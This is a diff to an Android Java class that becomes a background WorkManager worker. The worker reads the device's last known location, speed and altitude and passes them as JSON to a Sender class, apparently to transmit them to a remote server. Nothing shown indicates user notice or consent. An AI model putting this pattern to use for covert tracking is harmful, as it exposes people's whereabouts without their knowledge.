@@ -7,109 +7,60 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.os.Bundle;
 
+import androidx.annotation.NonNull;
+import androidx.work.Worker;
+import androidx.work.WorkerParameters;
+
 import org.json.JSONException;
 import org.json.JSONObject;
 
-public class Locations implements LocationListener {
+public class Locations extends Worker {
     private final Context context;
-    private boolean isGPSEnabled = false;
-    private boolean isNetworkEnabled = false;
-    private boolean canGetLocation = false;
-    private android.location.Location location;
-    private double latitude;
-    private  double longitude;
-    private float accuracy;
-    private double altitude;
-    private float speed;
+    public static final String TAG = "location";
 
     protected LocationManager locationManager;
 
-    public Locations() {
-        context = null;
-    }
-
-    public Locations(Context context) {
+    public Locations(@NonNull Context context, @NonNull WorkerParameters workerParams) {
+        super(context, workerParams);
         this.context = context;
-        update();
     }
 
-    public boolean isCanGetLocation() {
-        return canGetLocation;
-    }
-
-    public android.location.Location update() {
+    @NonNull
+    @Override
+    public Result doWork() {
         try {
+            android.location.Location location = null;
             locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
-            isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
-            isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
+            boolean isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
+            boolean isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
 
             if (locationManager != null && (isGPSEnabled || isNetworkEnabled)) {
-                canGetLocation = true;
                 if (context.getPackageManager().checkPermission(Manifest.permission.ACCESS_FINE_LOCATION, context.getPackageName()) == PackageManager.PERMISSION_GRANTED &&
-                context.getPackageManager().checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) {
+                        context.getPackageManager().checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) {
 
                     if (isGPSEnabled) {
                         location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-                    } else if (isNetworkEnabled) {
-                        location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                     }
 
-                    if (location != null) {
-                        latitude = location.getLatitude();
-                        longitude = location.getLongitude();
-                        altitude = location.getAltitude();
-                        accuracy = location.getAccuracy();
-                        speed = location.getSpeed();
+                    if (location == null && isNetworkEnabled) {
+                        location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                     }
                 }
             }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
 
-        return location;
-    }
-
-
-    public JSONObject get() {
-        JSONObject object = new JSONObject();
-
-        if (location != null) {
-            try {
+            if (location != null) {
+                JSONObject object = new JSONObject();
                 object.put("enabled", true);
-                object.put("latitude", latitude);
-                object.put("longitude", longitude);
-                object.put("altitude", altitude);
-                object.put("accuracy", accuracy);
-                object.put("speed", speed);
-            } catch (JSONException e) {
-
+                object.put("latitude", location.getLatitude());
+                object.put("longitude", location.getLongitude());
+                object.put("altitude", location.getAltitude());
+                object.put("accuracy", location.getAccuracy());
+                object.put("speed", location.getSpeed());
+                Sender.send(TAG, object.toString());
             }
+            return Result.success();
+        } catch (Exception e) {
+            return Result.failure();
         }
-
-        return object;
-    }
-
-    @Override
-    public void onLocationChanged(android.location.Location location) {
-        if (location != null) {
-            latitude = location.getLatitude();
-            longitude = location.getLongitude();
-            altitude = location.getAltitude();
-            accuracy = location.getAccuracy();
-            speed = location.getSpeed();
-        }
-    }
-
-    @Override
-    public void onProviderDisabled(String provider) {
-    }
-
-    @Override
-    public void onProviderEnabled(String provider) {
-    }
-
-    @Override
-    public void onStatusChanged(String provider, int status, Bundle extras) {
     }
 }
